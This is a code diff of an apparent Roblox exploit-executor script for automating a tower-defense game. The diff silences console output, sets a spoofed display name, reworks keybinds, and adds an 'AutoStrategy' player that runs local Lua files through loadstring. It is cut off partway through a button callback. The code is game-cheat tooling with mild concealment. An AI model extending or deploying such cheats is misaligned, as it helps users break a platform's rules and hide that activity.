@@ -3161,6 +3161,13 @@ local Globals = getgenv()
 
 if not game:IsLoaded() then game.Loaded:Wait() end
 
+-- Suppress all console output (no print/warn to Roblox console)
+do
+    local noop = function() end
+    if type(print) == "function" then print = noop end
+    if type(warn) == "function" then warn = noop end
+end
+
 -- // services & main refs
 local UserInputService = game:GetService("UserInputService")
 local VirtualUser = game:GetService("VirtualUser")
@@ -3253,7 +3260,6 @@ local SendRequest = request or http_request or httprequest
     or GetDevice and GetDevice().request
 
 if not SendRequest then 
-    warn("failure: no http function") 
     return 
 end
 
@@ -3322,7 +3328,9 @@ local DefaultSettings = {
     tagName = "None",
     Modifiers = {},
     MenuToggleKey = "RightShift",
-    StackTowerKey = "Q"
+    StackTowerKey = "Q",
+    AutostratPlaying = false,
+    AutostratPlayingConfig = ""
 }
 
 local LastState = {}
@@ -3456,6 +3464,9 @@ local function Apply3dRendering()
 end
 
 LoadSettings()
+-- Ensure UI toggle bind is Right Shift (displayed as RS)
+Globals.MenuToggleKey = "RightShift"
+SaveSettings()
 Apply3dRendering()
 
 local isTagChangerRunning = false
@@ -3580,7 +3591,7 @@ local function ClearPrivacyConns()
 end
 
 local function MakeSpoofName()
-    return "BelowNatural"
+    return "Trixion Hub"
 end
 
 local function EnsureSpoofName()
@@ -4146,13 +4157,14 @@ end
 local currentSection
 local Window = {}
 
--- Menu toggle keybind (key or mouse: stored in Globals.MenuToggleKey, e.g. "RightShift" or "MouseButton1")
+-- Menu toggle keybind (key or mouse: stored in Globals.MenuToggleKey, e.g. "RightShift" or "MouseButton1"; empty = no bind)
 local function getMenuToggleKeyCode()
-    local name = Globals and Globals.MenuToggleKey or "RightShift"
+    local name = Globals and Globals.MenuToggleKey
+    if not name or name == "" then return nil end
     local ok, ut = pcall(function() return Enum.UserInputType[name] end)
     if ok and ut then return nil end
     local ok2, kc = pcall(function() return Enum.KeyCode[name] end)
-    return (ok2 and kc) or Enum.KeyCode.RightShift
+    return (ok2 and kc) or nil
 end
 local function getMenuToggleUserInputType()
     local name = Globals and Globals.MenuToggleKey
@@ -4176,11 +4188,12 @@ local function connectMenuToggle()
 end
 connectMenuToggle()
 local function getStackTowerKeyCode()
-    local name = Globals and Globals.StackTowerKey or "Q"
+    local name = Globals and Globals.StackTowerKey
+    if not name or name == "" then return nil end
     local ok, ut = pcall(function() return Enum.UserInputType[name] end)
     if ok and ut then return nil end
     local ok2, kc = pcall(function() return Enum.KeyCode[name] end)
-    return (ok2 and kc) or Enum.KeyCode.Q
+    return (ok2 and kc) or nil
 end
 local function getStackTowerUserInputType()
     local name = Globals and Globals.StackTowerKey
@@ -4419,7 +4432,7 @@ function Window:Tab(opts)
     end
     return t
 end
-function Window:Notify(n) if n and (n.Desc or n.Title) then print(n.Title or "", n.Desc or "") end end
+function Window:Notify(n) end
 function Window:Line() end
 function Window:Dialog(d) if d and d.Button1 and d.Button1.Callback then d.Button1.Callback() end end
 -- Expose for strategy scripts loaded via loadstring
@@ -4437,6 +4450,19 @@ local function towerName(choice)
     if type(choice) == "string" and choice ~= "" then return choice end
     if type(choice) == "table" and type(choice.name) == "string" then return choice.name end
     return nil
+end
+
+-- Format key for display: empty -> "...", MouseButton1 -> MB1, two-word keys -> initials (e.g. RightShift -> RS)
+function formatKeyDisplay(rawKey)
+    local k = (rawKey and tostring(rawKey):gsub("^%s+", ""):gsub("%s+$", "")) or ""
+    if k == "" then return "..." end
+    if k == "MouseButton1" then return "MB1" end
+    if k == "MouseButton2" then return "MB2" end
+    if k == "MouseButton3" then return "MB3" end
+    -- Two-word CamelCase keys (e.g. RightShift, LeftControl) -> initials
+    local first, _, second = k:match("^(%u)(%l*)(%u)")
+    if first and second then return first .. second end
+    return k
 end
 
 local Main = Window:Tab({Title = "Main", Icon = "stamp"}) do
@@ -4492,8 +4518,7 @@ local Main = Window:Tab({Title = "Main", Icon = "stamp"}) do
             local fontSize = library.font_size or 12
             local fontFace = library.font_face
             local function getKeyDisplay()
-                local k = Globals.StackTowerKey
-                return (k and k ~= "" and tostring(k)) or "none"
+                return formatKeyDisplay(Globals.StackTowerKey)
             end
             local btn = Instance.new("TextButton")
             btn.Name = "StackTowerKeybind"
@@ -4534,14 +4559,21 @@ local Main = Window:Tab({Title = "Main", Icon = "stamp"}) do
                 keyLabel.Text = getKeyDisplay()
             end
             btn.MouseButton1Click:Connect(function()
+                task.defer(function()
                 keyLabel.Text = "..."
-                Window:Notify({Title = "Stack Tower", Desc = "Press any key or mouse button...", Time = 2, Type = "normal"})
+                Window:Notify({Title = "Stack Tower", Desc = "Press any key, mouse button, or Escape to clear", Time = 2, Type = "normal"})
                 local conn
+                local readyAt = tick() + 0.2
                 conn = game:GetService("UserInputService").InputBegan:Connect(function(input, gp)
                     if gp then return end
+                    if tick() < readyAt then return end
                     local keyName
                     if input.UserInputType == Enum.UserInputType.Keyboard then
-                        keyName = input.KeyCode.Name
+                        if input.KeyCode == Enum.KeyCode.Escape then
+                            keyName = ""
+                        else
+                            keyName = input.KeyCode.Name
+                        end
                     elseif input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.MouseButton2 or input.UserInputType == Enum.UserInputType.MouseButton3 then
                         keyName = input.UserInputType.Name
                     else
@@ -4550,11 +4582,16 @@ local Main = Window:Tab({Title = "Main", Icon = "stamp"}) do
                     SetSetting("StackTowerKey", keyName)
                     updateKeyDisplay()
                     if conn and conn.Connected then conn:Disconnect() end
-                    Window:Notify({Title = "Stack Tower", Desc = "Bound to " .. keyName, Time = 1, Type = "normal"})
+                    if keyName == "" then
+                        Window:Notify({Title = "Stack Tower", Desc = "Keybind cleared.", Time = 1, Type = "normal"})
+                    else
+                        Window:Notify({Title = "Stack Tower", Desc = "Bound to " .. formatKeyDisplay(keyName), Time = 1, Type = "normal"})
+                    end
                 end)
                 task.delay(10, function()
                     if conn and conn.Connected then conn:Disconnect() end
                     updateKeyDisplay()
+                end)
                 end)
             end)
         end
@@ -5598,7 +5635,7 @@ Window:Line()
 local Misc = Window:Tab({Title = "Misc", Icon = "box"}) do
     Misc:Section({Title = "Misc"})
     Misc:Toggle({
-        Title = "Enable Anti-Lag",
+        Title = "Enable AntiLag",
         Desc = "Boosts your FPS",
         Value = Globals.AntiLag,
         Callback = function(v)
@@ -5722,7 +5759,7 @@ end
 
 Window:Line()
 
--- Helper: keybind row (label left, small dark keybind button right, centered text, "none" when empty)
+-- Helper: keybind row (label left, small dark keybind button right, centered text, "..." when empty)
 local function addKeybindRow(parent, labelText, currentKey, onKeySet)
     local theme = library.theme
     local fontSize = library.font_size or 12
@@ -5746,8 +5783,7 @@ local function addKeybindRow(parent, labelText, currentKey, onKeySet)
     if fontFace then pcall(function() lbl.FontFace = fontFace end) end
     lbl.Parent = row
     local function getKeyDisplay()
-        local k = tostring(Globals.MenuToggleKey or "")
-        return (k ~= "" and k) or "none"
+        return formatKeyDisplay(Globals.MenuToggleKey)
     end
     local btnWrap = Instance.new("Frame")
     btnWrap.Name = "KeybindWrap"
@@ -5794,15 +5830,22 @@ local function addKeybindRow(parent, labelText, currentKey, onKeySet)
         keyLabel.Text = getKeyDisplay()
     end
     btn.MouseButton1Click:Connect(function()
+        task.defer(function()
         keyLabel.Text = "..."
-        Window:Notify({Title = "Menu", Desc = "Press any key or mouse button...", Time = 2, Type = "normal"})
+        Window:Notify({Title = "Menu", Desc = "Press any key, mouse button, or Escape to clear", Time = 2, Type = "normal"})
         local uis = game:GetService("UserInputService")
         local conn
+        local readyAt = tick() + 0.2
         conn = uis.InputBegan:Connect(function(input, gameProcessed)
             if gameProcessed then return end
+            if tick() < readyAt then return end
             local keyName
             if input.UserInputType == Enum.UserInputType.Keyboard then
-                keyName = input.KeyCode.Name
+                if input.KeyCode == Enum.KeyCode.Escape then
+                    keyName = ""
+                else
+                    keyName = input.KeyCode.Name
+                end
             elseif input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.MouseButton2 or input.UserInputType == Enum.UserInputType.MouseButton3 then
                 keyName = input.UserInputType.Name
             else
@@ -5812,21 +5855,604 @@ local function addKeybindRow(parent, labelText, currentKey, onKeySet)
             if onKeySet then onKeySet(keyName) end
             updateBtn()
             if conn and conn.Connected then conn:Disconnect() end
-            Window:Notify({Title = "Menu", Desc = "Bound to " .. keyName, Time = 1, Type = "normal"})
+            if keyName == "" then
+                Window:Notify({Title = "Menu", Desc = "Keybind cleared.", Time = 1, Type = "normal"})
+            else
+                Window:Notify({Title = "Menu", Desc = "Bound to " .. formatKeyDisplay(keyName), Time = 1, Type = "normal"})
+            end
         end)
         task.delay(10, function()
             if conn and conn.Connected then conn:Disconnect() end
             updateBtn()
+        end)
         end)
     end)
     return row, updateBtn
 end
 
 local Settings = Window:Tab({Title = "Settings", Icon = "settings"}) do
-    local uiSec = Settings:Section({Title = "UI Toggle", Side = "Left"})
-    if uiSec and uiSec.objects and uiSec.objects.content then
+    local configSec = Settings:Section({Title = "AutoStrategy", Side = "Left"})
+    if not configSec or not configSec.objects or not configSec.objects.content then end
+    local content = configSec and configSec.objects and configSec.objects.content
+    if content then
+        local AutoStratPlaying = false
+        local autostratsFolder = TDSFolder .. "/autostrats"
+        local theme = library.theme
+        local fontSize = library.font_size or 12
+        local fontFace = library.font_face
+
+        if makefolder and isfolder then
+            if not isfolder(TDSFolder) then makefolder(TDSFolder) end
+            if not isfolder(autostratsFolder) then makefolder(autostratsFolder) end
+        end
+
+        local function getConfigList()
+            if not isfolder then return "No configs yet" end
+            if not isfolder(TDSFolder) or not isfolder(autostratsFolder) then return "No configs yet" end
+            local list = {}
+            if listfiles then
+                for _, path in ipairs(listfiles(autostratsFolder)) do
+                    local name = path:match("[^/\\]+$") or path
+                    if name:lower():match("%.lua$") then list[#list + 1] = name end
+                end
+            end
+            if isfile(autostratsFolder .. "/run.lua") and not table.find(list, "run.lua") then
+                table.insert(list, "run.lua")
+            end
+            if #list == 0 then return "No configs yet" end
+            return table.concat(list, "\n")
+        end
+
+        -- Big Configs display box (where created/found configs are shown)
+        local configsWrap = Instance.new("Frame")
+        configsWrap.Name = "ConfigsDisplay"
+        configsWrap.Size = UDim2.new(1, 0, 0, 100)
+        configsWrap.Position = UDim2.new(0, 0, 0, 0)
+        configsWrap.BackgroundColor3 = theme.Main or Color3.fromRGB(26, 26, 26)
+        configsWrap.BorderSizePixel = 0
+        configsWrap.LayoutOrder = -1
+        configsWrap.Parent = content
+        local wrapCorner = Instance.new("UICorner")
+        wrapCorner.CornerRadius = UDim.new(0, 4)
+        wrapCorner.Parent = configsWrap
+        local configsInner = Instance.new("Frame")
+        configsInner.Name = "inner"
+        configsInner.Position = UDim2.new(0, 1, 0, 1)
+        configsInner.Size = UDim2.new(1, -2, 1, -2)
+        configsInner.BackgroundColor3 = theme.Inline or Color3.fromRGB(45, 45, 45)
+        configsInner.BorderSizePixel = 0
+        configsInner.Parent = configsWrap
+        local innerCorner = Instance.new("UICorner")
+        innerCorner.CornerRadius = UDim.new(0, 3)
+        innerCorner.Parent = configsInner
+        local orderFilePath = autostratsFolder .. "/.order"
+        local function getConfigNameList()
+            if not isfolder then return {} end
+            if not isfolder(TDSFolder) or not isfolder(autostratsFolder) then return {} end
+            local seen = {}
+            local list = {}
+            if readfile and isfile and isfile(orderFilePath) then
+                local ok, content = pcall(readfile, orderFilePath)
+                if ok and content then
+                    for line in (content):gmatch("[^\r\n]+") do
+                        local raw = line:gsub("^%s+", ""):gsub("%s+$", "")
+                        if raw ~= "" then
+                            local name = raw:lower():match("%.lua$") and raw or (raw .. ".lua")
+                            local fullPath = autostratsFolder .. "/" .. name
+                            if isfile(fullPath) and not seen[name] then
+                                local skip = false
+                                if readfile then
+                                    local ok, fileContent = pcall(readfile, fullPath)
+                                    if ok and (not fileContent or fileContent:gsub("%s+", "") == "") then skip = true end
+                                end
+                                if not skip then seen[name] = true list[#list + 1] = name end
+                            end
+                        end
+                    end
+                end
+            end
+            if listfiles then
+                for _, path in ipairs(listfiles(autostratsFolder)) do
+                    local name = path:match("[^/\\]+$") or path
+                    if name:lower():match("%.lua$") and name ~= ".order" and not seen[name] then
+                        local fullPath = autostratsFolder .. "/" .. name
+                        local skip = false
+                        if readfile and isfile(fullPath) then
+                            local ok, content = pcall(readfile, fullPath)
+                            if ok and (not content or content:gsub("%s+", "") == "") then skip = true end
+                        end
+                        if not skip then seen[name] = true list[#list + 1] = name end
+                    end
+                end
+            end
+            if isfile(autostratsFolder .. "/run.lua") and not seen["run.lua"] then
+                list[#list + 1] = "run.lua"
+            end
+            return list
+        end
+        local function appendToOrderFile(fileName)
+            if not writefile or not readfile or not isfile then return end
+            local name = fileName:lower():match("%.lua$") and fileName or (fileName .. ".lua")
+            if name == "" or name == ".lua" then return end
+            local existing = ""
+            if isfile(orderFilePath) then
+                pcall(function() existing = readfile(orderFilePath) or "" end)
+            end
+            for l in (existing):gmatch("[^\r\n]+") do
+                local n = l:gsub("^%s+", ""):gsub("%s+$", "")
+                if (n:lower():match("%.lua$") and n or n .. ".lua") == name then return end
+            end
+            pcall(writefile, orderFilePath, (existing == "" and "" or existing .. "\n") .. name)
+        end
+        local function removeFromOrderFile(fileName)
+            if not writefile or not readfile or not isfile then return end
+            local name = (fileName:lower():match("%.lua$") and fileName:lower() or (fileName:lower() .. ".lua"))
+            if name == "" or name == ".lua" then return end
+            if not isfile(orderFilePath) then return end
+            local existing = readfile(orderFilePath) or ""
+            local lines, changed = {}, false
+            for line in (existing):gmatch("[^\r\n]+") do
+                local n = line:gsub("^%s+", ""):gsub("%s+$", "")
+                local norm = (n:lower():match("%.lua$") and n:lower() or (n:lower() .. ".lua"))
+                if norm == name then changed = true else lines[#lines + 1] = line end
+            end
+            if changed then pcall(writefile, orderFilePath, table.concat(lines, "\n")) end
+        end
+
+        local configsListContainer = Instance.new("ScrollingFrame")
+        configsListContainer.Name = "ConfigsList"
+        configsListContainer.Size = UDim2.new(1, -8, 1, -8)
+        configsListContainer.Position = UDim2.new(0, 4, 0, 4)
+        configsListContainer.BackgroundTransparency = 1
+        configsListContainer.BorderSizePixel = 0
+        configsListContainer.ScrollBarThickness = 2
+        configsListContainer.ScrollBarImageColor3 = theme.Accent or theme.Text
+        configsListContainer.CanvasSize = UDim2.new(0, 0, 0, 0)
+        configsListContainer.AutomaticCanvasSize = Enum.AutomaticSize.Y
+        configsListContainer.ClipsDescendants = true
+        configsListContainer.Parent = configsInner
+        local configsListInner = Instance.new("Frame")
+        configsListInner.Name = "ListInner"
+        configsListInner.Size = UDim2.new(1, 0, 0, 0)
+        configsListInner.BackgroundTransparency = 1
+        configsListInner.AutomaticSize = Enum.AutomaticSize.Y
+        configsListInner.Parent = configsListContainer
+        local configsListLayout = Instance.new("UIListLayout")
+        configsListLayout.SortOrder = Enum.SortOrder.LayoutOrder
+        configsListLayout.Padding = UDim.new(0, 2)
+        configsListLayout.Parent = configsListInner
+
+        local selectedConfigRow = nil
+        local selectedConfigFileName = nil
+        local accentColor = theme.Accent or Color3.fromRGB(80, 120, 255)
+        local normalTextColor = theme.Text or Color3.fromRGB(255, 255, 255)
+
+        local configPreviewWrap = Instance.new("Frame")
+        configPreviewWrap.Name = "ConfigPreview"
+        configPreviewWrap.Size = UDim2.new(1, 0, 0, 72)
+        configPreviewWrap.BackgroundTransparency = 1
+        configPreviewWrap.BorderSizePixel = 0
+        configPreviewWrap.Visible = false
+        configPreviewWrap.Parent = content
+        local configPreviewInner = Instance.new("ScrollingFrame")
+        configPreviewInner.Size = UDim2.new(1, 0, 1, 0)
+        configPreviewInner.Position = UDim2.new(0, 0, 0, 0)
+        configPreviewInner.BackgroundColor3 = theme.Inline or Color3.fromRGB(40, 40, 45)
+        configPreviewInner.BorderSizePixel = 0
+        configPreviewInner.ScrollBarThickness = 6
+        configPreviewInner.ScrollBarImageColor3 = theme.Accent or theme.Text
+        configPreviewInner.CanvasSize = UDim2.new(0, 0, 0, 0)
+        configPreviewInner.AutomaticCanvasSize = Enum.AutomaticSize.Y
+        configPreviewInner.ClipsDescendants = true
+        configPreviewInner.ScrollingEnabled = true
+        configPreviewInner.CanvasPosition = Vector2.new(0, 0)
+        configPreviewInner.Parent = configPreviewWrap
+        local previewCorner = Instance.new("UICorner")
+        previewCorner.CornerRadius = UDim.new(0, 4)
+        previewCorner.Parent = configPreviewInner
+        local configPreviewCanvas = Instance.new("Frame")
+        configPreviewCanvas.Name = "PreviewCanvas"
+        configPreviewCanvas.Size = UDim2.new(1, -12, 0, 0)
+        configPreviewCanvas.Position = UDim2.new(0, 0, 0, 0)
+        configPreviewCanvas.BackgroundTransparency = 1
+        configPreviewCanvas.AutomaticSize = Enum.AutomaticSize.Y
+        configPreviewCanvas.Parent = configPreviewInner
+        local previewListLayout = Instance.new("UIListLayout")
+        previewListLayout.SortOrder = Enum.SortOrder.LayoutOrder
+        previewListLayout.Padding = UDim.new(0, 2)
+        previewListLayout.Parent = configPreviewCanvas
+        local previewPadding = Instance.new("UIPadding")
+        previewPadding.PaddingTop = UDim.new(0, 4)
+        previewPadding.PaddingBottom = UDim.new(0, 4)
+        previewPadding.PaddingLeft = UDim.new(0, 6)
+        previewPadding.PaddingRight = UDim.new(0, 6)
+        previewPadding.Parent = configPreviewCanvas
+
+        local function extractInnerDisplay(line)
+            local inner = line:match("%((.*)%)")
+            if not inner then return nil end
+            local parts = {}
+            for quoted in (inner .. ","):gmatch('"%s*([^"]*)"%s*,?') do
+                if quoted and quoted ~= "" then parts[#parts + 1] = quoted end
+            end
+            if #parts == 0 then return inner:gsub("^%s+", ""):gsub("%s+$", "") end
+            return table.concat(parts, ", ")
+        end
+
+        local function updateConfigPreview(fullName)
+            if not configPreviewWrap or not configPreviewCanvas then return end
+            configPreviewWrap.Visible = false
+            for _, child in ipairs(configPreviewCanvas:GetChildren()) do
+                if child:IsA("TextLabel") then child:Destroy() end
+            end
+            if not fullName or fullName == "" then return end
+            if not readfile or not isfile then return end
+            local path = autostratsFolder .. "/" .. (fullName:match("%.lua$") and fullName or fullName .. ".lua")
+            if not isfile(path) then return end
+            local ok, fileContent = pcall(readfile, path)
+            if not ok or not fileContent then return end
+            local sections = {}
+            for line in (fileContent):gmatch("[^\r\n]+") do
+                local trimmed = line:gsub("^%s+", ""):gsub("%s+$", "")
+                local inner
+                if trimmed:match("^TDS:Loadout%(") then
+                    inner = extractInnerDisplay(trimmed)
+                    if inner then sections[#sections + 1] = { title = "Loadout:", content = inner } end
+                elseif trimmed:match("^TDS:Mode%(") then
+                    inner = extractInnerDisplay(trimmed)
+                    if inner then sections[#sections + 1] = { title = "Mode:", content = inner } end
+                elseif trimmed:match("^TDS:GameInfo%(") then
+                    inner = extractInnerDisplay(trimmed)
+                    if inner then sections[#sections + 1] = { title = "Game Info:", content = inner } end
+                end
+            end
+            if #sections > 0 then
+                local layoutOrder = 0
+                for _, sec in ipairs(sections) do
+                    local titleLabel = Instance.new("TextLabel")
+                    titleLabel.Size = UDim2.new(1, 0, 0, 0)
+                    titleLabel.AutomaticSize = Enum.AutomaticSize.Y
+                    titleLabel.BackgroundTransparency = 1
+                    titleLabel.Text = sec.title
+                    titleLabel.TextColor3 = theme.Text or Color3.fromRGB(255, 255, 255)
+                    titleLabel.TextSize = math.max(11, fontSize)
+                    titleLabel.TextXAlignment = Enum.TextXAlignment.Center
+                    titleLabel.TextWrapped = true
+                    titleLabel.LayoutOrder = layoutOrder
+                    layoutOrder = layoutOrder + 1
+                    if fontFace then pcall(function() titleLabel.FontFace = fontFace end) end
+                    titleLabel.Parent = configPreviewCanvas
+                    local contentLabel = Instance.new("TextLabel")
+                    contentLabel.Size = UDim2.new(1, 0, 0, 0)
+                    contentLabel.AutomaticSize = Enum.AutomaticSize.Y
+                    contentLabel.BackgroundTransparency = 1
+                    contentLabel.Text = sec.content
+                    contentLabel.TextColor3 = theme["Text Inactive"] or theme.Text
+                    contentLabel.TextSize = math.max(10, fontSize - 1)
+                    contentLabel.TextXAlignment = Enum.TextXAlignment.Left
+                    contentLabel.TextWrapped = true
+                    contentLabel.LayoutOrder = layoutOrder
+                    layoutOrder = layoutOrder + 1
+                    if fontFace then pcall(function() contentLabel.FontFace = fontFace end) end
+                    contentLabel.Parent = configPreviewCanvas
+                end
+                configPreviewWrap.Visible = true
+            end
+        end
+
+        local function refreshConfigsDisplay()
+            if not configsListInner or not configsListInner.Parent then return end
+            selectedConfigRow = nil
+            selectedConfigFileName = nil
+            for _, c in ipairs(configsListInner:GetChildren()) do
+                if c:IsA("TextButton") or c:IsA("TextLabel") then
+                    c:Destroy()
+                end
+            end
+            local names = getConfigNameList()
+            for i, fullName in ipairs(names) do
+                local displayName = fullName:gsub("%.lua$", "")
+                local row = Instance.new("TextButton")
+                row.Name = "Config_" .. fullName
+                row.Size = UDim2.new(1, -4, 0, 16)
+                row.Position = UDim2.new(0, 0, 0, 0)
+                row.BackgroundTransparency = 1
+                row.BorderSizePixel = 0
+                row.Text = fullName
+                row.TextColor3 = normalTextColor
+                row.TextSize = math.max(10, fontSize - 1)
+                row.TextXAlignment = Enum.TextXAlignment.Center
+                row.AutoButtonColor = false
+                row.LayoutOrder = i
+                if fontFace then pcall(function() row.FontFace = fontFace end) end
+                row.Parent = configsListInner
+                row.MouseButton1Click:Connect(function()
+                    if selectedConfigRow then selectedConfigRow.TextColor3 = normalTextColor end
+                    selectedConfigRow = row
+                    selectedConfigFileName = fullName
+                    row.TextColor3 = accentColor
+                    if configNameTb and configNameTb.box then
+                        configNameTb.box.Text = displayName
+                    end
+                    updateConfigPreview(fullName)
+                end)
+            end
+            if #names == 0 then
+                local empty = Instance.new("TextLabel")
+                empty.Size = UDim2.new(1, -4, 0, 16)
+                empty.BackgroundTransparency = 1
+                empty.Text = "No configs yet"
+                empty.TextColor3 = theme["Text Inactive"] or Color3.fromRGB(188, 188, 188)
+                empty.TextSize = math.max(10, fontSize - 1)
+                empty.TextXAlignment = Enum.TextXAlignment.Center
+                empty.LayoutOrder = 0
+                if fontFace then pcall(function() empty.FontFace = fontFace end) end
+                empty.Parent = configsListInner
+            else
+                -- Re-apply selection so Play doesn't unselect (configNameTb is in closure)
+                local currentName = (configNameTb and configNameTb.box and configNameTb.box.Text or ""):gsub("%s+", "")
+                for _, child in ipairs(configsListInner:GetChildren()) do
+                    if child:IsA("TextButton") then
+                        local rowDisplay = child.Text:gsub("%.lua$", "")
+                        if currentName ~= "" and (child.Text == currentName or child.Text == currentName .. ".lua" or rowDisplay == currentName) then
+                            child.TextColor3 = accentColor
+                            selectedConfigRow = child
+                            selectedConfigFileName = child.Text
+                            if updateConfigPreview then updateConfigPreview(child.Text) end
+                            break
+                        end
+                    end
+                end
+            end
+        end
+
+        refreshConfigsDisplay()
+
+        local configNameTb = Settings:Textbox({
+            Title = "Config Name",
+            Value = "",
+            Placeholder = "Enter AutoStrat Name",
+            ClearTextOnFocus = false,
+            Callback = function() end
+        })
+
+        -- Enter script textbox (only shown after entering config name and pressing Create)
+        local scriptWrap = Instance.new("Frame")
+        scriptWrap.Name = "EnterScriptWrap"
+        scriptWrap.Size = UDim2.new(1, 0, 0, 56)
+        scriptWrap.BackgroundTransparency = 1
+        scriptWrap.BorderSizePixel = 0
+        scriptWrap.Visible = false
+        scriptWrap.Parent = content
+        local scriptLabel = Instance.new("TextLabel")
+        scriptLabel.Size = UDim2.new(1, -8, 0, 14)
+        scriptLabel.Position = UDim2.new(0, 0, 0, 0)
+        scriptLabel.BackgroundTransparency = 1
+        scriptLabel.Text = "Enter autostrat"
+        scriptLabel.TextColor3 = theme.Text
+        scriptLabel.TextSize = fontSize
+        scriptLabel.TextXAlignment = Enum.TextXAlignment.Left
+        if fontFace then pcall(function() scriptLabel.FontFace = fontFace end) end
+        scriptLabel.Parent = scriptWrap
+        local scriptBoxWrap = Instance.new("Frame")
+        scriptBoxWrap.Size = UDim2.new(1, 0, 0, 38)
+        scriptBoxWrap.Position = UDim2.new(0, 0, 0, 16)
+        scriptBoxWrap.BackgroundColor3 = theme.Main or Color3.fromRGB(26, 26, 26)
+        scriptBoxWrap.BorderSizePixel = 0
+        scriptBoxWrap.ClipsDescendants = true
+        scriptBoxWrap.Parent = scriptWrap
+        local scriptBoxCorner = Instance.new("UICorner")
+        scriptBoxCorner.CornerRadius = UDim.new(0, 4)
+        scriptBoxCorner.Parent = scriptBoxWrap
+        local scriptBoxInner = Instance.new("Frame")
+        scriptBoxInner.Position = UDim2.new(0, 1, 0, 1)
+        scriptBoxInner.Size = UDim2.new(1, -2, 1, -2)
+        scriptBoxInner.BackgroundColor3 = theme.Inline or Color3.fromRGB(45, 45, 45)
+        scriptBoxInner.BorderSizePixel = 0
+        scriptBoxInner.Parent = scriptBoxWrap
+        local scriptBoxInnerCorner = Instance.new("UICorner")
+        scriptBoxInnerCorner.CornerRadius = UDim.new(0, 3)
+        scriptBoxInnerCorner.Parent = scriptBoxInner
+        local scriptTb = Instance.new("TextBox")
+        scriptTb.Name = "ScriptBox"
+        scriptTb.Size = UDim2.new(1, -8, 1, -6)
+        scriptTb.Position = UDim2.new(0, 4, 0, 3)
+        scriptTb.BackgroundTransparency = 1
+        scriptTb.BorderSizePixel = 0
+        scriptTb.Text = ""
+        scriptTb.PlaceholderText = ">.<"
+        scriptTb.PlaceholderColor3 = theme["Text Inactive"] or Color3.fromRGB(188, 188, 188)
+        scriptTb.TextColor3 = theme.Text
+        scriptTb.TextSize = math.max(10, fontSize - 1)
+        scriptTb.TextXAlignment = Enum.TextXAlignment.Left
+        scriptTb.TextYAlignment = Enum.TextYAlignment.Top
+        scriptTb.ClearTextOnFocus = false
+        scriptTb.MultiLine = true
+        scriptTb.TextWrapped = true
+        if fontFace then pcall(function() scriptTb.FontFace = fontFace end) end
+        scriptTb.Parent = scriptBoxInner
+
+        local function runConfigFile(fileName)
+            if not readfile or not isfile then
+                Window:Notify({Title = "Strats Player", Desc = "readfile/isfile not available.", Time = 3, Type = "error"})
+                return false
+            end
+            if not isfolder or not isfolder(autostratsFolder) then
+                Window:Notify({Title = "Strats Player", Desc = "Folder tds/autostrats not found.", Time = 3, Type = "error"})
+                return false
+            end
+            local runPath = autostratsFolder .. "/" .. fileName
+            if not isfile(runPath) then
+                Window:Notify({Title = "Strats Player", Desc = "Config not found: " .. fileName, Time = 3, Type = "error"})
+                return false
+            end
+            local ok, code = pcall(readfile, runPath)
+            if not ok then
+                Window:Notify({Title = "Strats Player", Desc = "Failed to read: " .. tostring(code), Time = 4, Type = "error"})
+                return false
+            end
+            if not code or code == "" then
+                Window:Notify({Title = "Strats Player", Desc = "Config is empty: " .. fileName, Time = 2, Type = "normal"})
+                return false
+            end
+            local fn, err = loadstring(code, "autostrats/" .. fileName)
+            if not fn then
+                Window:Notify({Title = "Strats Player", Desc = "Load error: " .. tostring(err), Time = 5, Type = "error"})
+                return false
+            end
+            local waitTDS = 0
+            while not _G.TDS and not shared.TDSTable and waitTDS < 50 do
+                task.wait(0.2)
+                waitTDS = waitTDS + 1
+            end
+            local TDS = _G.TDS or shared.TDSTable
+            if not TDS then
+                Window:Notify({Title = "Strats Player", Desc = "TDS not ready. Try again.", Time = 3, Type = "error"})
+                return false
+            end
+            local runOk, runErr = pcall(function()
+                fn(TDS)
+            end)
+            if not runOk then
+                local runOk2, runErr2 = pcall(function()
+                    fn()
+                end)
+                if not runOk2 then
+                    Window:Notify({Title = "Strats Player", Desc = "Run error: " .. tostring(runErr), Time = 5, Type = "error"})
+                    return false
+                end
+            end
+            return true
+        end
+
+        local function startAutostratPlayer(configName)
+            local raw = (configName and tostring(configName):gsub("%s+", ""):gsub("[^%w%._%-]", "")) or ""
+            local fileName = (raw ~= "") and raw or "run"
+            if not fileName:lower():match("%.lua$") then fileName = fileName .. ".lua" end
+            if makefolder and not isfolder(TDSFolder) then makefolder(TDSFolder) end
+            if makefolder and not isfolder(autostratsFolder) then makefolder(autostratsFolder) end
+            task.spawn(function()
+                local ran = runConfigFile(fileName)
+                if ran then
+                    Window:Notify({Title = "Strats Player", Desc = "Executed: " .. fileName, Time = 2, Type = "normal"})
+                end
+            end)
+        end
+
+        Settings:Button({Title = "Play", Desc = "Execute selected autostrat (select in list above)", Callback = function()
+            local name = (configNameTb and configNameTb.box and configNameTb.box.Text or ""):gsub("%s+", ""):gsub("[^%w%._%-]", "")
+            if name == "" then
+                local list = getConfigNameList()
+                if #list > 0 then
+                    name = list[1]:gsub("%.lua$", "")
+                end
+            end
+            if name == "" then
+                Window:Notify({Title = "Strats Player", Desc = "Select a config from the list or create one first.", Time = 3, Type = "normal"})
+                return
+            end
+            startAutostratPlayer(name)
+        end})
+
+        Settings:Button({Title = "Stop", Desc = "Clear saved play state", Callback = function()
+            SetSetting("AutostratPlaying", false)
+            SetSetting("AutostratPlayingConfig", "")
+            Window:Notify({Title = "Strats Player", Desc = "Cleared.", Time = 1, Type = "normal"})
+        end})
+
+        -- Divider between player controls and config management
+        local divider = Instance.new("Frame")
+        divider.Name = "StratsPlayerDivider"
+        divider.Size = UDim2.new(1, -4, 0, 2)
+        divider.BackgroundColor3 = theme.Accent or theme.Border or Color3.fromRGB(53, 60, 108)
+        divider.BorderSizePixel = 0
+        divider.Parent = content
+        local divCorner = Instance.new("UICorner")
+        divCorner.CornerRadius = UDim.new(0, 1)
+        divCorner.Parent = divider
+
+        Settings:Button({Title = "Create", Desc = "Enter config name first, then Create; enter script and Create again to save", Callback = function()
+            if not writefile or not makefolder or not isfolder then
+                Window:Notify({Title = "Strats Player", Desc = "Create not available.", Time = 2, Type = "error"})
+                return
+            end
+            local name = (configNameTb and configNameTb.box and configNameTb.box.Text or ""):gsub("%s+", ""):gsub("[^%w%._%-]", "")
+            if name == "" then
